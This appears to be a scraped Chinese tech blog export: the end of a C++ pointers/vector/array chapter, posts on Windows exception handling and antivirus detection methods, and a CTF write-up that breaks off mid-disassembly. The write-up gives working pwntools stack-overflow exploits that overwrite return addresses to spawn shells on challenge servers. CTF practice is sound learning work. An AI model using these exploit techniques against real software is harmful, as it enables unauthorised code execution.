释放动态内存 delete dyn_ptr_array[0]; delete dyn_ptr_array[1]; dyn_ptr_array[0] = nullptr; dyn_ptr_array[1] = nullptr; return 0;&#125; 指针数组常用于存储 C 风格字符串数组（const char*[]）或管理一组动态分配的对象。 4. 指向指针的指针 (Pointer to Pointer): 指针本身也是变量，它也有自己的内存地址。因此，可以声明一个指向指针的指针。 123456789101112131415161718192021222324#include &lt;iostream&gt;int main() &#123; int value = 42; int *ptr = &amp;value; // ptr 指向 value (int*) int **pptr = &amp;ptr; // pptr 指向 ptr (int**) std::cout &lt;&lt; &quot;Value: &quot; &lt;&lt; value &lt;&lt; std::endl; // 42 std::cout &lt;&lt; &quot;Address of value (&amp;value): &quot; &lt;&lt; &amp;value &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Value of ptr (address of value): &quot; &lt;&lt; ptr &lt;&lt; std::endl; // value 的地址 std::cout &lt;&lt; &quot;Value via ptr (*ptr): &quot; &lt;&lt; *ptr &lt;&lt; std::endl; // 42 std::cout &lt;&lt; &quot;Address of ptr (&amp;ptr): &quot; &lt;&lt; &amp;ptr &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Value of pptr (address of ptr): &quot; &lt;&lt; pptr &lt;&lt; std::endl; // ptr 的地址 std::cout &lt;&lt; &quot;Value via pptr (*pptr): &quot; &lt;&lt; *pptr &lt;&lt; std::endl; // ptr 的值 (即 value 的地址) std::cout &lt;&lt; &quot;Value via pptr (**pptr): &quot; &lt;&lt; **pptr &lt;&lt; std::endl; // value 的值 (42) // 修改值 **pptr = 50; std::cout &lt;&lt; &quot;New value: &quot; &lt;&lt; value &lt;&lt; std::endl; // 输出 50 return 0;&#125; 指向指针的指针常用于： 在函数中修改调用者传入的指针本身（使其指向不同的地址）。 处理动态分配的指针数组（例如 char** argv in main）。 总结: 通过组合基本类型、数组、结构、指针等，可以构建出非常灵活和强大的数据结构。理解每种组合方式的内存布局、访问方式以及（特别是涉及指针和动态内存时）生命周期管理规则是编写复杂 C++程序的关键。随着学习的深入，我们将看到更多高级的组合和抽象方式，例如使用类和标准库容器。 4.10 数组的替代品虽然 C++ 内置的数组（包括动态分配的数组）功能强大，但它们存在一些固有的缺点：数组大小通常需要在编译时确定（对于栈上的数组），或者需要手动进行动态内存管理（对于堆上的数组），并且不提供边界检查等安全特性。 C++ 标准模板库 (STL) 提供了更安全、更灵活的数组替代品：vector 和 array。 4.10.1 模板类vectorstd::vector 是 STL 提供的一个动态数组模板类。它封装了动态大小的数组，可以根据需要自动增长或缩小，并负责管理其元素的内存。 特点: 动态大小: 可以在运行时添加或删除元素，vector 会自动处理内存的重新分配。 内存管理: 自动管理元素存储的内存（通常在自由存储区/堆上分配）。 随机访问: 像普通数组一样，可以通过索引 [] 快速访问任何元素。 边界检查 (可选): 提供 at() 成员函数进行带边界检查的元素访问。 丰富的成员函数: 提供 push_back(), pop_back(), size(), empty(), clear(), insert(), erase() 等多种方便的操作。 模板类: vector 是一个模板，需要指定存储的元素类型，例如 std::vector&lt;int&gt;, std::vector&lt;double&gt;, std::vector&lt;std::string&gt;。 使用方法: 包含头文件: #include &lt;vector&gt; 声明和初始化: 1234567891011#include &lt;vector&gt;#include &lt;string&gt;// 声明std::vector&lt;int&gt; scores; // 创建一个空的 int vectorstd::vector&lt;double&gt; lengths(10); // 创建包含 10 个 double 元素的 vector (默认初始化为 0.0)std::vector&lt;std::string&gt; names(5, &quot;Unknown&quot;); // 创建包含 5 个 string 元素，都初始化为 &quot;Unknown&quot;// C++11 列表初始化std::vector&lt;int&gt; primes &#123;2, 3, 5, 7, 11&#125;; // 创建并初始化std::vector&lt;char&gt; vowels &#123;&#x27;a&#x27;, &#x27;e&#x27;, &#x27;i&#x27;, &#x27;o&#x27;, &#x27;u&#x27;&#125;; 访问元素: [] 运算符: scores[0], names[i] (不进行边界检查)。 at() 函数: scores.at(0), names.at(i) (进行边界检查，越界抛出 std::out_of_range 异常)。 常用操作: push_back(value): 在 vector 末尾添加一个元素。 size(): 返回 vector 中元素的数量。 empty(): 检查 vector 是否为空。 clear(): 移除所有元素。 pop_back(): 移除末尾的元素。 用法与示例: 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;string&gt;int main() &#123; // 创建和初始化 std::vector&lt;int&gt; numbers; // 空 vector std::vector&lt;std::string&gt; tasks &#123;&quot;Read&quot;, &quot;Write&quot;, &quot;Code&quot;&#125;; // 添加元素 numbers.push_back(10); // numbers: &#123;10&#125; numbers.push_back(20); // numbers: &#123;10, 20&#125; numbers.push_back(30); // numbers: &#123;10, 20, 30&#125; // 访问元素 std::cout &lt;&lt; &quot;First number: &quot; &lt;&lt; numbers[0] &lt;&lt; std::endl; // 输出 10 std::cout &lt;&lt; &quot;Second task: &quot; &lt;&lt; tasks.at(1) &lt;&lt; std::endl; // 输出 Write // std::cout &lt;&lt; tasks.at(3); // 会抛出异常 // 修改元素 numbers[0] = 15; // 获取大小 std::cout &lt;&lt; &quot;Number of tasks: &quot; &lt;&lt; tasks.size() &lt;&lt; std::endl; // 输出 3 // 遍历 vector (C++11 基于范围的 for 循环) std::cout &lt;&lt; &quot;Numbers:&quot;; for (int num : numbers) &#123; std::cout &lt;&lt; &quot; &quot; &lt;&lt; num; &#125; std::cout &lt;&lt; std::endl; // 输出 Numbers: 15 20 30 // 遍历 vector (传统 for 循环) std::cout &lt;&lt; &quot;Tasks:&quot;; for (size_t i = 0; i &lt; tasks.size(); ++i) &#123; // 使用 size_t 作为索引类型 std::cout &lt;&lt; &quot; &quot; &lt;&lt; tasks[i]; &#125; std::cout &lt;&lt; std::endl; // 输出 Tasks: Read Write Code // 移除末尾元素 numbers.pop_back(); // numbers: &#123;15, 20&#125; std::cout &lt;&lt; &quot;Last number after pop: &quot; &lt;&lt; numbers.back() &lt;&lt; std::endl; // back() 访问最后一个元素 return 0;&#125; std::vector 是 C++ 中替代动态数组的首选方案，因为它更安全、更易于管理。 4.10.2 模板类array（C++11）C++11 引入了 std::array 模板类，它封装了固定大小的数组。与 C 风格数组类似，其大小在编译时确定，但它提供了更现代的接口和一些 vector 具有的便利性（如 size(), at()）。 特点: 固定大小: 数组大小必须在编译时指定为模板参数，之后不能改变。 内存位置: 通常在栈上分配内存（如果作为局部变量声明），与 C 风格数组类似，除非显式使用 new 创建。 类型安全: 大小是类型的一部分 (std::array&lt;int, 5&gt; 和 std::array&lt;int, 10&gt; 是不同的类型)。 STL 接口: 提供与 vector 类似的接口，如 size(), empty(), at(), [], front(), back()，以及迭代器支持，可以方便地与 STL 算法一起使用。 无开销抽象: 通常不会比 C 风格数组带来额外的运行时性能开销。 模板类: 需要指定元素类型和大小，例如 std::array&lt;int, 10&gt;, std::array&lt;double, 3&gt;。 使用方法: 包含头文件: #include &lt;array&gt; 声明和初始化: 123456789101112131415#include &lt;array&gt;#include &lt;string&gt;// 声明std::array&lt;int, 5&gt; scores; // 创建包含 5 个 int 的 array (元素值未定义，除非是静态存储)std::array&lt;double, 3&gt; coords &#123;&#125;; // 创建包含 3 个 double 的 array, 零初始化 &#123;0.0, 0.0, 0.0&#125;// C++11 列表初始化std::array&lt;int, 4&gt; values &#123;1, 2, 3, 4&#125;; // 创建并初始化std::array&lt;std::string, 2&gt; names &#123;&quot;Alice&quot;, &quot;Bob&quot;&#125;;// 注意: 初始化列表的元素数量不能超过 array 的大小// std::array&lt;int, 3&gt; errors &#123;1, 2, 3, 4&#125;; // 错误!// 如果元素数量少于 array 大小，剩余元素会被值初始化 (通常为 0)std::array&lt;int, 5&gt; partial &#123;10, 20&#125;; // &#123;10, 20, 0, 0, 0&#125; 访问元素: [] 运算符: scores[0], names[i] (不进行边界检查)。 at() 函数: scores.at(0), names.at(i) (进行边界检查，越界抛出 std::out_of_range 异常)。 常用操作: size(): 返回数组的大小（编译时常量）。 empty(): 检查数组是否为空（对于大小 &gt; 0 的 std::array 总是返回 false）。 fill(value): 将所有元素设置为指定值。 front(): 访问第一个元素。 back(): 访问最后一个元素。 用法与示例: 123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;#include &lt;array&gt;#include &lt;string&gt;#include &lt;numeric&gt; // 为了 std::accumulateint main() &#123; // 创建和初始化 std::array&lt;int, 5&gt; data &#123;10, 20, 30, 40, 50&#125;; std::array&lt;std::string, 3&gt; colors &#123;&quot;Red&quot;, &quot;Green&quot;, &quot;Blue&quot;&#125;; std::array&lt;double, 4&gt; temps &#123;&#125;; // &#123;0.0, 0.0, 0.0, 0.0&#125; // 访问元素 std::cout &lt;&lt; &quot;First data element: &quot; &lt;&lt; data[0] &lt;&lt; std::endl; // 输出 10 std::cout &lt;&lt; &quot;Second color: &quot; &lt;&lt; colors.at(1) &lt;&lt; std::endl; // 输出 Green std::cout &lt;&lt; &quot;A temperature: &quot; &lt;&lt; temps[2] &lt;&lt; std::endl; // 输出 0 // 获取大小 std::cout &lt;&lt; &quot;Size of data array: &quot; &lt;&lt; data.size() &lt;&lt; std::endl; // 输出 5 // 填充 temps.fill(25.5); std::cout &lt;&lt; &quot;Filled temperature: &quot; &lt;&lt; temps[0] &lt;&lt; std::endl; // 输出 25.5 // 遍历 (C++11 基于范围的 for 循环) std::cout &lt;&lt; &quot;Colors:&quot;; for (const auto&amp; color : colors) &#123; // 使用 const 引用避免复制 std::cout &lt;&lt; &quot; &quot; &lt;&lt; color; &#125; std::cout &lt;&lt; std::endl; // 输出 Colors: Red Green Blue // 与 STL 算法一起使用 double sum = std::accumulate(temps.begin(), temps.end(), 0.0); // 计算总和 std::cout &lt;&lt; &quot;Sum of temperatures: &quot; &lt;&lt; sum &lt;&lt; std::endl; return 0;&#125; std::array 是替代需要固定大小数组的 C 风格数组的现代 C++ 方案。 4.10.3 比较数组、vector对象和array对象 特性 C 风格数组 (T[]) std::vector&lt;T&gt; std::array&lt;T, N&gt; (C++11) 大小 固定 (编译时确定栈数组，运行时确定堆数组) 动态 (可运行时改变) 固定 (编译时确定) 内存分配 栈 (局部) 或 静态区 或 堆 (new[]) 通常在堆上 (自由存储区) 通常在栈上 (除非用 new 创建) 大小信息 无内置方法获取大小 (需单独传递) size() 成员函数 size() 成员函数 (编译时常量) 边界检查 无 (不安全) at() 提供检查, [] 不提供 at() 提供检查, [] 不提供 赋值/复制 不能直接赋值/复制整个数组 可以直接赋值/复制 (深拷贝) 可以直接赋值/复制 (成员逐一复制) 作为函数参数 通常退化为指针 (丢失大小信息) 可以按值、引用或指针传递 可以按值、引用或指针传递 STL 兼容性 有限 (需要指针和大小) 完全兼容 (提供迭代器等) 完全兼容 (提供迭代器等) 性能 通常最快 (直接内存访问) 访问速度快，添加/删除可能涉及内存重分配 通常与 C 风格数组性能相同 头文件 无需 &lt;vector&gt; &lt;array&gt; 选择建议: 需要动态大小: 如果数组大小在运行时才能确定，或者需要在程序运行期间改变大小，**std::vector 是最佳选择**。 需要固定大小 (编译时已知): 如果数组大小在编译时就确定且不会改变： **优先选择 std::array (C++11 及以后)**。它提供了与 C 风格数组相同的性能和内存布局（通常在栈上），但具有更安全、更方便的接口（如 size(), at(), 迭代器）。 如果不能使用 C++11 或有特定 C 接口兼容性需求，可以使用 C 风格数组，但要特别注意安全性和大小管理。 性能关键且大小固定: std::array 和 C 风格数组通常性能最佳。 总的来说，在现代 C++ 中，应优先使用 std::vector 和 std::array 而不是 C 风格数组，以获得更好的类型安全、内存管理和易用性。 4.11 总结本章介绍了C++的**复合类型 (Compound Types)**，它们允许我们将多个值组合成一个数据单元。 我们首先学习了**数组 (Array)**，它用于存储一系列相同类型的数据。我们了解了如何声明数组、使用索引访问元素（从0开始），以及初始化数组的各种规则，包括C++11引入的更安全的列表初始化方法。我们强调了数组大小必须是常量表达式，并且访问数组时需要注意边界，避免越界访问。 接着，我们探讨了处理文本数据的两种方式。第一种是传统的C风格字符串，即以空字符 \\0 结尾的 char 数组。我们学习了如何拼接字符串常量、在数组中使用字符串、以及使用 cin 和 getline 读取字符串输入，并特别注意了混合输入数字和整行字符串时可能遇到的问题。 第二种，也是C++中更推荐的方式，是使用标准库提供的 string 类。string 类提供了自动内存管理、方便的赋值、拼接 (+) 和附加 (+=) 操作，以及大量用于查找、修改、比较和访问字符的成员函数。我们还学习了如何使用 cin, cout, 和 getline 对 string 对象进行输入输出，并了解了C++11引入的原始字符串字面值和Unicode字符串字面值。 结构 (Structure) 被引入作为一种创建自定义复合类型的方式，允许将不同类型的数据项（成员）组合在一起。我们学习了如何定义结构、声明结构变量、使用点运算符 (.) 访问成员，以及C++11的列表初始化。我们还看到结构体可以包含 string 对象或数组作为成员，结构变量可以相互赋值，可以作为函数参数（按值、按引用、按指针）和返回值。结构数组允许我们管理一组结构对象，而位字段则提供了一种在结构内精确控制成员占用位数的方式。 共用体 (Union) 作为另一种复合类型被介绍，其特点是所有成员共享同一块内存空间，主要用于节省内存或进行类型双关（需谨慎）。我们了解了如何定义和访问共用体，以及使用匿名共用体。 枚举 (Enum) 提供了一种创建具名整数常量的方式，提高了代码的可读性和类型安全。我们学习了如何定义枚举、显式设置枚举量的值、枚举的取值范围，并简要介绍了C++11引入的更安全的**作用域内枚举 (enum class)**。 本章的一个核心内容是指针 (Pointer) 和**自由存储空间 (Free Store / Heap)**。指针是存储内存地址的变量。我们学习了如何声明和初始化指针（包括使用 &amp; 获取地址和初始化为 nullptr），如何使用解引用运算符 * 访问指针指向的值，并强调了使用未初始化指针、空指针或悬挂指针的危险。 我们学习了使用 new 运算符在自由存储区动态分配内存（用于单个变量或对象），以及使用 delete 运算符释放这些内存。同样，我们学习了使用 new[] 动态分配数组，并强调必须使用 delete[] 来释放动态数组内存。正确配对 new/delete 和 new[]/delete[] 对于避免内存泄漏和程序崩溃至关重要。 指针与数组的紧密关系以及指针算术也被详细讨论。数组名通常可视为指向第一个元素的指针，指针算术允许在数组元素间移动。我们还看到了如何使用指针处理C风格字符串，以及如何动态创建结构并使用箭头运算符 (-&gt;) 通过指针访问其成员。最后，我们区分了三种主要的存储持续性：自动存储（栈）、静态存储和动态存储（堆）。 我们还探讨了如何组合这些类型，例如创建包含数组或指针成员的结构、指针数组以及指向指针的指针，以构建更复杂的数据表示。 最后，我们介绍了C++标准库提供的内置数组的现代替代品：**std::vector**（动态大小数组）和 **std::array**（固定大小数组，C++11）。它们提供了更安全、更方便的接口和自动内存管理（对于 vector），是现代C++编程中推荐的选择。 通过本章的学习，我们掌握了创建和使用各种复合数据类型以及进行动态内存管理的基本技能。","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"C++","slug":"C","permalink":"http://uniqueland.top/tags/C/"}]},{"title":"Windows异常处理机制深度解析","slug":"windows_exception","date":"2025-03-31T15:49:59.201Z","updated":"2025-03-31T16:19:42.614Z","comments":true,"path":"2025/03/31/windows_exception/","link":"","permalink":"http://uniqueland.top/2025/03/31/windows_exception/","excerpt":"","text":"什么是Windows异常Windows异常是指在程序执行过程中遇到的非正常情况，这些情况会中断程序正常的执行流程。Windows操作系统提供了完善的异常处理机制来应对这些情况，使程序能够优雅地处理错误并尽可能恢复正常运行。 从本质上看，Windows异常可分为两大类：硬件异常和软件异常。硬件异常由CPU直接产生，如内存访问违规、除零错误等；而软件异常则是由程序代码主动触发，如C++的throw语句、Windows API中的RaiseException函数等。 常见的异常触发情况及现象在日常编程和系统使用中，异常可能由多种情况触发。内存访问违规是一种常见情况，包括访问空指针（0x00000000）、访问已释放的内存或尝试写入只读内存区域。计算异常也时有发生，如除零操作、整数溢出或浮点运算错误。非法指令异常则可能源于执行无效或特权指令，或是错误地执行数据区域的内容。此外，还有程序通过RaiseException API、C++的throw语句或.NET中的throw指令主动抛出的异常。 这些异常触发时，用户可能会看到不同的现象：应用程序崩溃并显示”XXX已停止工作”的对话框；Windows错误报告工具弹出；程序无预警地终止运行；在调试环境中触发断点；甚至在严重的内核模式异常情况下导致系统蓝屏。这些现象都是Windows异常处理机制工作的外在表现。 Windows异常处理流程当异常发生时，Windows会按照一个严格的顺序尝试处理异常。首先是异常的触发，CPU检测到异常条件并生成中断。如果程序在调试器下运行，调试器拥有第一优先权来处理这个异常，这使开发人员能够在异常发生的第一时间分析问题。 若无调试器或调试器选择不处理，系统会调用已注册的向量化异常处理函数（Vectored Exception Handlers，VEH）。接下来，如果异常仍未被处理，系统会遍历当前线程的结构化异常处理（Structured Exception Handling，SEH）链，查找能够处理该异常的处理器。 当SEH链中没有合适的处理器时，系统会调用顶层异常过滤器（UnhandledExceptionFilter函数）作为最后的应用程序级防线。如果所有这些机制都无法处理异常，系统将接管并执行默认处理：显示错误对话框并终止进程。这种层层递进的设计确保了异常能够在最适当的层次被处理，同时提供了多重保障机制。 即：异常触发 -- 调试器（若存在） -- 已注册的VEH处理函数（影响整个进程） -- 遍历线程的SEH链（影响单个线程） -- 顶层异常过滤器（兜底） -- 系统默认处理 异常处理各环节的作用及区别调试器处理是异常处理流程的第一关卡。调试器拥有处理异常的最高优先级，可以在异常发生的第一时间捕获并暂停程序执行。这一环节的独特之处在于它能够展示异常发生时的完整上下文，允许开发者修改程序状态后继续执行。异常在调试器中分为一次机会和二次机会异常，为调试提供了灵活性。 向量化异常处理（VEH）提供了一种全局性的异常处理机制，其最大特点是不受函数调用堆栈的限制。开发者可以通过AddVectoredExceptionHandler API注册处理函数，系统会按注册顺序或反序调用所有处理函数。VEH特别适合全局错误监控、日志记录等场景，且不需要在代码中添加特殊的语言结构（如try/except）。 结构化异常处理（SEH）是Windows传统的核心异常处理方式，提供了基于调用栈的异常保护机制。它通过__try/__except/__finally块实现，采用链表结构并与函数调用堆栈紧密关联。SEH遵循”先注册后使用”的LIFO原则，这意味着最近设置的异常处理器会首先被调用。值得一提的是，C++异常处理机制在Windows平台的底层实现也是基于SEH的。 顶层异常过滤器作为应用程序级别的最后防线，负责处理所有未被捕获的异常。通过SetUnhandledExceptionFilter API，每个进程可以设置一个顶层异常过滤器。这一机制常用于实现崩溃转储功能，是构建自定义应用程序错误报告系统的理想选择。 当所有用户定义的异常处理器都无法处理异常时，操作系统的默认处理机制接管。系统会显示应用程序错误对话框，可能生成错误报告发送到Microsoft，并终止发生异常的进程，释放其占用的资源。这是保证系统稳定性的最后一道防线。 通过这种分层的异常处理机制，Windows提供了强大而灵活的错误处理能力，既适合开发人员进行调试，也能为最终用户提供较好的错误恢复体验。对于安全研究人员来说，深入理解这套机制对于漏洞分析和利用同样具有重要意义。","categories":[],"tags":[{"name":"Windows","slug":"Windows","permalink":"http://uniqueland.top/tags/Windows/"}]},{"title":"病毒扫描背后的秘密：从特征码到智能防御的技术揭秘","slug":"virus_defence","date":"2025-03-31T14:00:59.126Z","updated":"2025-03-31T14:27:37.497Z","comments":true,"path":"2025/03/31/virus_defence/","link":"","permalink":"http://uniqueland.top/2025/03/31/virus_defence/","excerpt":"","text":"在数字世界中，病毒与杀毒软件的对抗从未停歇。要实现精准的病毒查杀，核心依赖于三大技术：病毒特征码识别、行为监控以及启发式分析。本文将解析这些技术的原理与实现方式，揭开病毒扫描背后的原理。 病毒扫描的核心：特征码检测特征码检测的实现过程病毒特征码是从病毒样本中提取的独特二进制代码片段，通常不超过64字节，可视为病毒的“数字指纹”。特征码检测的实现需要经过以下技术流程： 样本采集与预处理通过沙箱捕获、用户上报或蜜罐系统收集病毒样本。例如，安全厂商VirusTotal每天接收超过100万份可疑文件，经人工分析后提取有效特征码。样本需经过脱壳（如UPX、ASPack等常见壳）、解密等预处理，以获取病毒原始代码。 代码逆向与特征定位使用逆向工具（如IDA Pro、Ghidra）分析病毒二进制文件，定位核心功能模块（如感染模块、加密函数）。例如，WannaCry病毒的MS17-010漏洞利用代码段会被标记为关键特征。为确保特征码稳定性，通常会选择代码段（.text节）而非数据段（.data节），避免病毒变种修改数据导致失效。 复合特征码生成对多态病毒（如Emotet），需提取多段特征码形成逻辑组合。例如，某勒索病毒的特征码可能包括： 字符串特征：&quot;This file is encrypted by [家族名]&quot;； 代码特征：特定API调用序列（如CryptEncrypt→DeleteFile）； 哈希特征：加密函数所在代码节的SHA-256值。 特征码优化与验证使用工具（如MyCCL）进行冲突测试：将特征码插入正常文件，验证是否触发误报。通过模糊哈希（ssdeep）技术降低特征码对微小修改的敏感度，提升对抗变种病毒的能力。 行为监控：实时防御的“动态哨兵”行为监控的技术原理行为监控不依赖静态特征码，而是通过钩子（Hook）技术实时监控程序行为，主要关注以下高危操作： 文件操作：短时间内加密大量文件（如勒索病毒行为）； 进程注入：将代码写入其他进程内存（如DLL注入）； 注册表篡改：修改系统启动项或服务配置； 网络行为：异常端口扫描或C2服务器通信。 实现流程示例（以勒索病毒检测为例） API监控层通过内核级钩子（如Windows的SSDT Hook）监控CreateFile、WriteFile等文件操作API。当某进程连续调用CreateFile打开100个文档文件，立即触发预警。 行为关联分析结合上下文判断操作风险：若该进程同时调用CryptGenKey生成加密密钥，并删除卷影副本（通过vssadmin.exe），则判定为勒索病毒，触发实时拦截。 沙箱验证机制对可疑进程进行隔离运行（如Cuckoo沙箱），观察其是否释放加密勒索信（如README.txt），最终确认恶意行为。 启发式分析：未知威胁的“逻辑捕手”启发式分析的核心机制启发式分析通过预定义规则集对程序进行风险评分，主要检测以下可疑模式： 代码结构异常 PE头信息篡改（如入口点指向资源节）； 节区段熵值过高（可能经过加密或压缩）； 导入表异常（如仅依赖LoadLibrary和GetProcAddress动态加载API）。 行为模式评分构建评分系统（满分100分），例如： 创建自启动项：+20分； 尝试关闭杀毒软件进程：+30分； 无数字签名且评分超过70分：判定为恶意程序。 机器学习模型使用随机森林或神经网络模型，输入特征包括： API调用序列（如VirtualAlloc→WriteProcessMemory→CreateRemoteThread的典型注入序列）； 字符串特征（如硬编码IP地址或域名）； 代码相似度（与已知病毒家族的代码块匹配度）。 病毒库的高效构建与匹配机制病毒库的工程化设计直接影响扫描性能。典型方案包括： 分库存储：按特征码哈希首字母划分16个子库，减少遍历次数； 增量更新：仅同步新增特征码，避免全量下载占用资源； 并行处理：多线程同时扫描文件的不同区段，充分利用多核CPU性能。 技术演进与未来防御趋势当前病毒防御面临两大挑战： 未知病毒检测：传统特征码仅能应对已知威胁； 零日攻击防御：APT攻击常利用未公开漏洞，绕过常规检测。 未来技术将向以下方向发展： AI与机器学习：通过训练模型识别恶意代码模式，例如分析API调用序列或内存行为异常； 云安全协同：实时共享全球病毒特征数据，构建分布式威胁情报网络； 主动防御系统：基于程序行为实时拦截可疑操作，而非依赖事后特征匹配。 用户防护建议 选择杀毒软件：优先考虑病毒库更新频率快、资源占用低的工具； 系统维护：定期安装安全补丁，避免漏洞被利用； 安全意识：谨慎扫描不明来源的二维码或链接，防止钓鱼攻击。 结语病毒防御是技术与意识的双重博弈。尽管特征码技术仍是当前主流，但其局限性催生了行为分析、AI预测等新一代解决方案。用户需在依赖技术防护的同时，保持警惕，方能构筑全面的数字安全防线。","categories":[],"tags":[{"name":"CyberSecurity","slug":"CyberSecurity","permalink":"http://uniqueland.top/tags/CyberSecurity/"}]},{"title":"XSCTF_fresh","slug":"xsctf_fresh","date":"2024-11-09T19:03:42.512Z","updated":"2024-11-09T19:29:29.091Z","comments":true,"path":"2024/11/10/xsctf_fresh/","link":"","permalink":"http://uniqueland.top/2024/11/10/xsctf_fresh/","excerpt":"","text":"c_master请使用简单的C语句对程序进行getshell吧！ 123456Try to write a C getshell program with my code!read(0,base,0x8);write(1,base,0x8);base+&#x3D;8;base-&#x3D;8;return 0; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [rsp+4h] [rbp-1Ch] void *s; // [rsp+8h] [rbp-18h] char v6[8]; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 v7; // [rsp+18h] [rbp-8h] v7 = __readfsqword(0x28u); init(argc, argv, envp); v4 = 0; s = malloc(0x400uLL); memset(s, 0, 1024uLL); puts(&quot;Try to write a C getshell program with my code!&quot;); puts(&quot;read(0,base,0x8);&quot;); puts(&quot;write(1,base,0x8);&quot;); puts(&quot;base+=8;&quot;); puts(&quot;base-=8;&quot;); puts(&quot;return 0;&quot;); while ( 1 ) &#123; while ( 1 ) &#123; while ( 1 ) &#123; while ( 1 ) &#123; while ( 1 ) &#123; puts(&quot;&gt;&gt;&gt;&quot;); __isoc99_scanf(&quot;%128s&quot;, s); if ( strcmp((const char *)s, &quot;read(0,base,0x8);&quot;) ) break; puts(&quot;input:&quot;); read(0, &amp;v6[v4], 8uLL); &#125; if ( strcmp((const char *)s, &quot;write(1,base,0x8);&quot;) ) break; puts(&quot;output:&quot;); write(1, &amp;v6[v4], 8uLL); &#125; if ( strcmp((const char *)s, &quot;base+=8;&quot;) ) break; v4 += 8; &#125; if ( strcmp((const char *)s, &quot;base-=8;&quot;) ) break; v4 -= 8; &#125; if ( strcmp((const char *)s, &quot;return 0;&quot;) ) break; puts(&quot;No such code...&quot;); &#125; return 0;&#125; 根据输入确定写入数据的地址，那么可以直接将位置定位到main函数的返回地址，写入程序中提供的backdoor函数需要注意程序开了canary，所以要多往后走一次 Low Address … local var &lt;- rsp canary value &lt;- rbp-8 old rbp &lt;- rbp return address args High Address … 坑：直接返回到backdoor函数又不可以，需要返回到实际执行system函数的代码地址 exp 123456789101112131415161718from pwn import *p = remote(&quot;43.248.97.213&quot;, 30483)p.recv()p.sendline(b&quot;base+=8;&quot;)p.recv()p.sendline(b&quot;base+=8;&quot;)p.recv()p.sendline(b&quot;base+=8;&quot;)p.recv()p.sendline(b&quot;read(0,base,0x8);&quot;)p.recv()p.sendline(p64(0x4012c3))p.recv()p.sendline(b&quot;return 0;&quot;)p.interactive() XSCTF&#123;p1e4se_bec0me_4_c_m4ster_x5c7f&#125; rock_paper_scissors欢迎来到石头剪刀布！一共进行三十局，你赢了加一分，输了或平局不得分获得十分就算胜利！输入’石头’、’剪刀’或’布’来进行游戏 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980int __cdecl main(int argc, const char **argv, const char **envp)&#123; unsigned int v3; // eax char v5[28]; // [rsp+0h] [rbp-30h] BYREF int v6; // [rsp+1Ch] [rbp-14h] unsigned int RandomMove; // [rsp+20h] [rbp-10h] unsigned int userout; // [rsp+24h] [rbp-Ch] int v9; // [rsp+28h] [rbp-8h] signed int v10; // [rsp+2Ch] [rbp-4h] v10 = 0; v9 = 0; v3 = time(0LL); srand(v3); puts(&amp;byte_402080); puts(&amp;byte_4020A0); puts(&amp;byte_4020E6); puts(&amp;byte_402108); while ( v10 &lt;= 9 &amp;&amp; v9 &lt;= 29 ) &#123; printf(&amp;byte_402139); fflush(stdout); if ( v10 &gt; 5 ) gets(v5); __isoc99_scanf(&amp;unk_402151, v5); userout = stringToMove(v5); if ( userout == -1 ) &#123; puts(&amp;byte_402158); &#125; else if ( v10 &gt; 8 || v10 &lt;= 5 || (int)hard() &lt;= 2 ) &#123; if ( v10 == 9 &amp;&amp; (unsigned int)hell() != 666 ) &#123;LABEL_10: win(userout, v10); &#125; else &#123; RandomMove = getRandomMove(); printf(&amp;format); if ( RandomMove == 2 ) &#123; puts(&amp;byte_402037); &#125; else if ( RandomMove &lt;= 2 ) &#123; if ( RandomMove ) puts(&amp;byte_40203E); else puts(&amp;s2); &#125; v6 = determineWinner(userout, RandomMove); if ( v6 == 1 ) &#123; puts(&amp;byte_4021A7); ++v10; &#125; else if ( v6 == -1 ) &#123; puts(&amp;byte_402054); &#125; else &#123; puts(&amp;byte_402073); &#125; printf(&amp;byte_402061, (unsigned int)v10); ++v9; &#125; &#125; else &#123; if ( (int)hard() &lt;= 4 ) goto LABEL_10; bewin(userout, v10); &#125; &#125; final(); return 0;&#125; 其中final函数就是最终的shell，而gets函数存在漏洞，可以使用栈溢出将当前函数的返回地址覆盖为final函数的返回地址但是传输的payload需要符合一定条件因为程序对输入进行了检查，输入的字符串必须是石头剪刀布的一种这种情况下可以用%00作为payload，即输入石头的编码后加上%00，这样程序在处理字符串时遇到%00就会认为已经到字符串末尾了，而实际的payload会全部传输到内存中 中文在C语言中使用utf-8编码，一个中文字符占用三个字节在构造payload时要注意端序，例如“石头”的utf-8编码是E79FB3E5A4B4但是实际传输时是p64(0xe5b39fe7)+p64(0xb4a4) exp 123456789from pwn import *# p = process(&#x27;./rock_paper_scissors&#x27;)p = remote(&#x27;43.248.97.213&#x27;, 30480)# print(list(p64(0xe5b39fe7)+p64(0xb4a4)))p.recv()p.sendline(p64(0xe5b39fe7)+p64(0xb4a4)+b&#x27;a&#x27;*20+b&#x27;b&#x27;*8+p64(0x4012db))p.interactive() XSCTF&#123;1bab71b8-117f-4dea-a047-340b72101d7b&#125; toolong一个字节能解决的shellcode，就不要用两个字节！ 程序两次接收用户输入，其中第二次应该输入shellcode，之后程序会将用户输入的shellcode直接执行，但是题目限制了输入shellcode的长度（24） 题目给的可执行文件反汇编失败，估计是将字符串地址作为函数地址直接调用导致的 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273.text:000055A4CE79820E ; int __cdecl main(int argc, const char **argv, const char **envp).text:000055A4CE79820E public main.text:000055A4CE79820E main proc near ; DATA XREF: _start+18↑o.text:000055A4CE79820E.text:000055A4CE79820E s&#x3D; byte ptr -150h.text:000055A4CE79820E buf&#x3D; byte ptr -50h.text:000055A4CE79820E var_8&#x3D; dword ptr -8.text:000055A4CE79820E var_4&#x3D; dword ptr -4.text:000055A4CE79820E.text:000055A4CE79820E ; __unwind &#123; &#x2F;&#x2F; 55A4CE797000.text:000055A4CE79820E endbr64.text:000055A4CE798212 push rbp.text:000055A4CE798213 mov rbp, rsp.text:000055A4CE798216 sub rsp, 150h.text:000055A4CE79821D mov eax, 